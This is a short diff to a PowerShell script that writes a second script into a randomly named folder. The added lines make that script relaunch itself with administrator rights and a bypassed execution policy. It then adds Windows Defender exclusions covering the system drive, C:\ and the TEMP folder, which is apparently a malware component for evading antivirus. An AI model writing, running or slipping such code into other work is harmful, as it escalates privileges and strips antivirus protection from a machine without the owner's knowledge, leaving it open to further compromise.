@@ -21,6 +21,11 @@ $fullPath = Join-Path -Path $randomPath -ChildPath $randomProgram
 New-Item -Path $fullPath -ItemType Directory -Force | Out-Null
 
 $scriptContent = @"
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
+    Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"' -Verb RunAs
+    exit
+}
+
 Add-MpPreference -ExclusionPath `"$env:SystemDrive\`"
 Add-MpPreference -ExclusionPath `"C:\`"
 Add-MpPreference -ExclusionPath `"$env:TEMP`"
